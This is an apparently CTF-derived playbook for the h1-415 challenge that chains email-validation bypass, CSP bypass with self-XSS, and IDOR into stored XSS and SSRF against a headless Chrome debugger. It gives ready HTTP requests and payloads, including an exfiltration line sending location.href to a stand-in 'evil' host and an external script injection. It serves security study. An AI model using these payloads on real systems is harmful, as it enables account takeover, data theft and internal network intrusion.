# Chained Email Validation Bypass, CSP Bypass, XSS, IDOR, and SSRF for Account Takeover and Internal Resource Access

Multi-stage attack chain demonstrating a complete workflow from account takeover to internal network access via chained web vulnerabilities in a customer support platform.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 10 |
| Execution Time | ~30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Email Validation Bypass for Account Takeover] --> B[CSP Bypass and Self-XSS]
    B --> C[Exfiltrate Agent's Internal URL]
    C --> D[Access Internal Support Page]
    D --> E[IDOR to Update User Details]
    E --> F[Stored XSS Injection]
    F --> G[SSRF via Iframe to Internal Port]
    G --> H[Port Scanning and Flag Retrieval]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#3498db
    style F fill:#9b59b6
    style G fill:#9b59b6
    style H fill:#27ae60
```



## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]

### Target Environment

- Web platform with registration and support portals
- Exposed source code revealing customer emails
- Headless Chrome instance on port 9222 for debugging
- Ports: 3000 (internal app), 9222 (Chrome debugger)

### Initial Access Requirements

- No prior credentials needed; starts with public registration endpoint
- Network access to public site (https://h1-415.h1ctf.com)
- Ability to inspect source code for leaked emails

## Detailed Attack Procedures

### Step 1: Identify Exposed Customer Email
procedure: [[procedures/Account-Takeover-via-Email-Validation-Bypass]]

**Objective**: Locate an existing customer email from source code to target for takeover.

**Instructions**: Inspect the application's source code or public pages to find hardcoded or leaked emails like jobert@mydocz.cosmic. Note that the system prevents direct registration with existing emails.

**Expected Output**: Email address such as jobert@mydocz.cosmic.

**Success Indicators**:
- Email found in source code
- Confirmation that registration is blocked for existing emails

### Step 2: Bypass Email Validation for Registration
procedure: [[procedures/Account-Takeover-via-Email-Validation-Bypass]]

**Objective**: Modify the registration request to register with a variant of the existing email, enabling QR code generation for takeover.

**Instructions**: Use [[tools/Burp-Suite]] to intercept the POST request to https://h1-415.h1ctf.com/register. Change the email parameter to 'jobert@mydocz.cosmic <' (append space and <). The QR code generation trims special characters like <>{}, allowing a seemingly valid QR for the original email.

```http
POST /register HTTP/1.1
Host: h1-415.h1ctf.com
Content-Type: application/x-www-form-urlencoded

email=jobert%40mydocz.cosmic%20%3C&...
```

**Expected Output**: Successful registration response with QR code generated.

**Success Indicators**:
- QR code saved
- No validation error on modified email

### Step 3: Use QR Code for Account Takeover
procedure: [[procedures/Account-Takeover-via-Email-Validation-Bypass]]

**Objective**: Login as the existing customer using the bypassed QR code.

**Instructions**: After registration, save the QR code. Logout, then navigate to https://h1-415.h1ctf.com/recover and scan the QR code to authenticate as jobert@mydocz.cosmic.

**Expected Output**: Access to the customer's dashboard.

**Success Indicators**:
- Successful login as target account
- Access to customer-specific features

### Step 4: Inject HTML to Bypass CSP
procedure: [[procedures/CSP-Bypass-and-Self-XSS-in-Support-Portal]]

**Objective**: Bypass Content Security Policy to enable script execution in the support portal.

**Instructions**: In the support portal chat, inject a crafted URL like https://raw.githack.com/mattboldt/typed.js/master/lib/@https://github.com/checkm50/checkm50.github.io/master/40.js to evade CSP rules and load external scripts, setting up self-XSS.

**Expected Output**: Script execution in the browser console without CSP violation.

**Success Indicators**:
- No CSP error in console
- External script loaded

### Step 5: Trigger Agent Review and Exfiltrate URL
procedure: [[procedures/Exfiltrate-Internal-URL-via-Agent-Review]]

**Objective**: Escalate self-XSS to the agent's browser by prompting a review and exfiltrating their internal URL.

**Instructions**: In the browser console, execute [[commands/showReviewModal]] to open the review modal. Submit a 1-star rating to trigger agent review of chat logs. The injected script runs on the agent's side, exfiltrating their location via an img src to http://evil/image.png?loc= + location.href.

```javascript
showReviewModal();
```

**Expected Output**: Agent interaction prompted; exfiltrated URL received on attacker's server.

**Success Indicators**:
- Modal opens
- URL like https://localhost:3000/support/review/... exfiltrated

### Step 6: Access Internal Support Page
procedure: [[procedures/Access-Internal-Support-Page-via-Hostname-Replacement]]

**Objective**: Use the exfiltrated internal URL to access restricted support features publicly.

**Instructions**: From the exfiltrated data (e.g., https://localhost:3000/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd), replace localhost:3000 with h1-415.h1ctf.com and navigate to the URL.

**Expected Output**: Public access to the chat review page.

**Success Indicators**:
- Page loads without authentication
- Internal chat logs visible

### Step 7: Create Second Trial Account
procedure: [[procedures/IDOR-for-Unauthorized-User-Update]]

**Objective**: Register a secondary account for testing authorization bypass.

**Instructions**: Register a new trial account via the standard registration flow to obtain a user_id (e.g., user_id=6).

**Expected Output**: New account created with assigned user_id.

**Success Indicators**:
- Account dashboard accessible
- user_id retrievable from requests

### Step 8: Bypass Authorization to Update User Details
procedure: [[procedures/IDOR-for-Unauthorized-User-Update]]

**Objective**: Update another user's details without proper checks using arbitrary user_id.

**Instructions**: From the review page https://h1-415.h1ctf.com/support/review/{id}, send a POST request with name=<inject>&email=jobert%40mydocz.cosmic&username=jobert&user_id=<second user_id>&_csrf_token=987d. No authorization validation on user_id.

```http
POST /support/review/{id} HTTP/1.1
Host: h1-415.h1ctf.com
Content-Type: application/x-www-form-urlencoded

name=<inject-here>&email=jobert%40mydocz.cosmic&username=jobert&user_id=6&_csrf_token=987d
```

**Expected Output**: User details updated successfully.

**Success Indicators**:
- Second account's details modified
- No access denied error

### Step 9: Inject Stored XSS into Name Field
procedure: [[procedures/Stored-XSS-Injection-via-User-Name-Field]]

**Objective**: Inject persistent XSS payload into the user's name for later execution.

**Instructions**: In the update POST, set name=<script src='http://external.com/some.js'></script> along with other parameters to store the XSS in the user profile.

```http
name=%3Cscript%20src%3D%27http%3A%2F%2Fexternal.com%2Fsome.js%27%3E%3C%2Fscript%3E&email=jobert%40mydocz.cosmic&username=jobert&user_id=6&_csrf_token=987d
```

**Expected Output**: XSS payload stored and confirmed via profile view.

**Success Indicators**:
- Script executes when profile is viewed
- External resource loaded

### Step 10: Escalate to SSRF via Iframe
procedure: [[procedures/SSRF-via-Injected-Iframe-to-Headless-Chrome-Debugger]]

**Objective**: Use injected iframe to target internal ports, enabling SSRF and access to sensitive resources.

**Instructions**: Inject name=<iframe src='http://localhost:9222/json' width=900 height=900></iframe> into the update POST. When rendered (e.g., in agent view), it requests the headless Chrome debugger endpoint, allowing port scanning and retrieval of internal documents like the flag h1ctf{y3s_1m_c0sm1c_n0w}.

```http
name=%3Ciframe%20src%3D%27http%3A%2F%2Flocalhost%3A9222%2Fjson%27%20width%3D900%20height%3D900%3E%3C%2Fiframe%3E&...
```

**Expected Output**: Iframe loads internal JSON data; access to secret document.

**Success Indicators**:
- Internal port response visible
- Flag or sensitive data retrieved

## Attack Chain Summary

### Key Achievements

1. Account takeover of existing customer via email bypass
2. Exfiltration of internal URLs through agent XSS
3. Unauthorized updates and persistent XSS via IDOR
4. SSRF to internal Chrome debugger for resource access and flag retrieval

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]] Valid Accounts (auth bypass)
- [[JavaScript]] JavaScript (XSS execution)
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application (SSRF, IDOR)

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution
- [[Discovery]] Discovery
- [[Collection]] Collection

---

*Last updated: 2023-10-01T12:00:00Z*
